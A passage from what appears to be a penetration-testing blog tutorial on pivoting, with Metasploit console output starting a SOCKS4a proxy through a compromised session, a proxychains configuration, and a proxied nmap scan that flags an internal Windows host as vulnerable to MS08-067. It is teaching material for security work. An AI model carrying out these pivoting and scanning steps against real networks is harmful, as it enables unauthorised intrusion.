class="enlighter-text">socks4a</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set srvhost </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">srvhost =</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">auxiliary</span><span class="enlighter-g1">(</span><span class="enlighter-text">socks4a</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> run</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Auxiliary module execution completed</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Starting the socks4a proxy server</span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">auxiliary</span><span class="enlighter-g1">(</span><span class="enlighter-text">socks4a</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> netstat -antp </span><span class="enlighter-g0">|</span><span class="enlighter-text"> grep </span><span class="enlighter-n1">1080</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> exec: netstat -antp </span><span class="enlighter-g0">|</span><span class="enlighter-text"> grep </span><span class="enlighter-n1">1080</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">tcp        </span><span class="enlighter-n1">0</span><span class="enlighter-text">      </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">            </span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-n1">0</span><span class="enlighter-text">:*               LISTEN      </span><span class="enlighter-n1">3626</span><span class="enlighter-text">/ruby       </span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">auxiliary</span><span class="enlighter-g1">(</span><span class="enlighter-text">socks4a</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span></div></div></div><div class="enlighter-raw">meterpreter &gt; background 
[*] Backgrounding session 2...
msf &gt; use auxiliary/server/socks4a 
msf auxiliary(socks4a) &gt; show options 

Module options (auxiliary/server/socks4a):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  

msf auxiliary(socks4a) &gt; set srvhost 172.16.0.20
srvhost =&gt; 172.16.0.20
msf auxiliary(socks4a) &gt; run
[*] Auxiliary module execution completed

[*] Starting the socks4a proxy server
msf auxiliary(socks4a) &gt; netstat -antp | grep 1080
[*] exec: netstat -antp | grep 1080

tcp        0      172.16.0.20:1080            0.0.0.0:*               LISTEN      3626/ruby       
msf auxiliary(socks4a) &gt; </div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">meterpreter &gt; background 
[*] Backgrounding session 2...
msf &gt; use auxiliary/server/socks4a 
msf auxiliary(socks4a) &gt; show options 

Module options (auxiliary/server/socks4a):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  

msf&nbsp;auxiliary(socks4a)&nbsp;&gt;&nbsp;set&nbsp;srvhost&nbsp;172.16.0.20
srvhost&nbsp;=&gt;&nbsp;172.16.0.20
msf auxiliary(socks4a) &gt; run
[*] Auxiliary module execution completed

[*] Starting the socks4a proxy server
msf auxiliary(socks4a) &gt; netstat -antp | grep 1080
[*] exec: netstat -antp | grep 1080

tcp        0      172.16.0.20:1080            0.0.0.0:*               LISTEN      3626/ruby       
msf auxiliary(socks4a) &gt; 
</pre>
<p>With the <strong>ProxyChains</strong> tool developed for GNU\Linux operating systems, any TCP connection can be routed to destinations via TOR or SOCKS4, SOCKS5, HTTP / HTTPS. Multiple proxy servers can be used in this tunneling technique. In addition to providing anonymity, applications such as pivoting can also be used to direct traffic to new networks discovered.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-564" src="https://pentest.blog/wp-content/uploads/proxy.png" alt="" width="744" height="187" srcset="https://pentest.blog/wp-content/uploads/proxy.png 744w, https://pentest.blog/wp-content/uploads/proxy-300x75.png 300w" sizes="(max-width: 744px) 100vw, 744px"></p>
<p>In the last line of the file /etc/proxychains.conf opened with a text editor, the information of the newly created socks4 proxy server is entered.</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">--- snippet ---</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">ProxyList</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-c0"># add proxy here ...</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-c0"># meanwile</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-c0"># defaults set to "tor"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-c0">#socks4  127.0.0.1 9050</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">socks4  </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"> </span><span class="enlighter-n1">1080</span></div></div></div><div class="enlighter-raw">--- snippet ---

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4  127.0.0.1 9050
socks4  172.16.0.20 1080</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">--- snippet ---

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4  127.0.0.1 9050
socks4  172.16.0.20 1080
</pre>
<p>Performing a nmap scan with proxychains is a simple process.&nbsp;Network packages will be delivered to the destination via the defined proxy.</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">root@kali:~</span><span class="enlighter-c0"># proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 7.7.7.20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">ProxyChains-</span><span class="enlighter-n0">3.1</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">http:</span><span class="enlighter-c0">//proxychains.sf.net)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Starting Nmap </span><span class="enlighter-n0">7.25</span><span class="enlighter-text">BETA1 </span><span class="enlighter-g1">(</span><span class="enlighter-text"> https:</span><span class="enlighter-c0">//nmap.org )</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">445</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">80</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">135</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">139</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">135</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">139</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">445</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">139</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">135</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">445</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">Nmap scan report </span><span class="enlighter-k1">for</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Host is </span><span class="enlighter-m0">up</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n0">0.17</span><span class="enlighter-text">s latency</span><span class="enlighter-g1">)</span><span class="enlighter-text">.</span></div></div><div class=""><div><span class="enlighter-text">PORT     STATE    SERVICE      VERSION</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">22</span><span class="enlighter-text">/tcp   open     ssh          Bitvise WinSSHD </span><span class="enlighter-n0">7.16</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">FlowSsh </span><span class="enlighter-n0">7.15</span><span class="enlighter-text">; protocol </span><span class="enlighter-n0">2.0</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">80</span><span class="enlighter-text">/tcp   closed   http         Easy File Sharing Web Server httpd </span><span class="enlighter-n0">6.9</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">135</span><span class="enlighter-text">/tcp  open     msrpc        Microsoft Windows RPC</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">139</span><span class="enlighter-text">/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">445</span><span class="enlighter-text">/tcp  open     microsoft-ds Microsoft Windows </span><span class="enlighter-n1">2003</span><span class="enlighter-text"> or </span><span class="enlighter-n1">2008</span><span class="enlighter-text"> microsoft-ds</span></div></div><div class=""><div><span class="enlighter-text">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Host script results:</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">|</span><span class="enlighter-text"> smb-vuln-ms08-</span><span class="enlighter-n4">067</span><span class="enlighter-text">: </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">|</span><span class="enlighter-text">   VULNERABLE:</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">|</span><span class="enlighter-text">   Microsoft Windows system vulnerable to remote code </span><span class="enlighter-m0">execution</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">MS08-</span><span class="enlighter-n4">067</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">|</span><span class="enlighter-text">     State: VULNERABLE</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">|</span><span class="enlighter-text">     IDs: CVE:CVE-</span><span class="enlighter-n1">2008</span><span class="enlighter-text">-</span><span class="enlighter-n1">4250</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">|</span><span class="enlighter-text">          The Server service </span><span class="enlighter-k1">in</span><span class="enlighter-text"> Microsoft Windows </span><span class="enlighter-n1">2000</span><span class="enlighter-text"> SP4, XP SP2 and SP3, Server </span><span class="enlighter-n1">2003</span><span class="enlighter-text"> SP1 and SP2, </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">|</span><span class="enlighter-text">          Vista Gold and SP1, Server </span><span class="enlighter-n1">2008</span><span class="enlighter-text">, and </span><span class="enlighter-n1">7</span><span class="enlighter-text"> Pre-Beta allows remote attackers to execute arbitrary </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">|</span><span class="enlighter-text">          code via a crafted RPC request that triggers the overflow during path canonicalization.</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">|</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">|</span><span class="enlighter-text">     Disclosure date: </span><span class="enlighter-n1">2008</span><span class="enlighter-text">-</span><span class="enlighter-n1">10</span><span class="enlighter-text">-</span><span class="enlighter-n1">23</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">|</span><span class="enlighter-text">     References:</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">|</span><span class="enlighter-text">       https:</span><span class="enlighter-c0">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">|_      https:</span><span class="enlighter-c0">//technet.microsoft.com/en-us/library/security/ms08-067.aspx</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Service detection performed. Please report any incorrect results at https:</span><span class="enlighter-c0">//nmap.org/submit/ .</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Nmap done: </span><span class="enlighter-n1">1</span><span class="enlighter-text"> IP </span><span class="enlighter-m0">address</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n1">1</span><span class="enlighter-text"> host up</span><span class="enlighter-g1">)</span><span class="enlighter-text"> scanned </span><span class="enlighter-k1">in</span><span class="enlighter-text"> </span><span class="enlighter-n0">12.51</span><span class="enlighter-text"> seconds</span></div></div><div class=""><div><span class="enlighter-text">root@kali:~</span><span class="enlighter-c0">#</span></div></div></div><div class="enlighter-raw">root@kali:~# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 7.7.7.20
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.25BETA1 ( https://nmap.org )
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:80-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK
Nmap scan report for 7.7.7.20
Host is up (0.17s latency).
PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          Bitvise WinSSHD 7.16 (FlowSsh 7.15; protocol 2.0)
80/tcp   closed   http         Easy File Sharing Web Server httpd 6.9
135/tcp  open     msrpc        Microsoft Windows RPC
139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds Microsoft Windows 2003 or 2008 microsoft-ds
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs: CVE:CVE-2008-4250
|          The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, 
|          Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary 
|          code via a crafted RPC request that triggers the overflow during path canonicalization.
| 
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
root@kali:~#</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">root@kali:~# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 7.7.7.20
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.25BETA1 ( https://nmap.org )
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:80-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK
Nmap scan report for 7.7.7.20
Host is up (0.17s latency).
PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          Bitvise WinSSHD 7.16 (FlowSsh 7.15; protocol 2.0)
80/tcp   closed   http         Easy File Sharing Web Server httpd 6.9
135/tcp  open     msrpc        Microsoft Windows RPC
139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds Microsoft Windows 2003 or 2008 microsoft-ds
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs: CVE:CVE-2008-4250
|          The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, 
|          Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary 
|          code via a crafted RPC request that triggers the overflow during path canonicalization.
| 
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
root@kali:~#</pre>
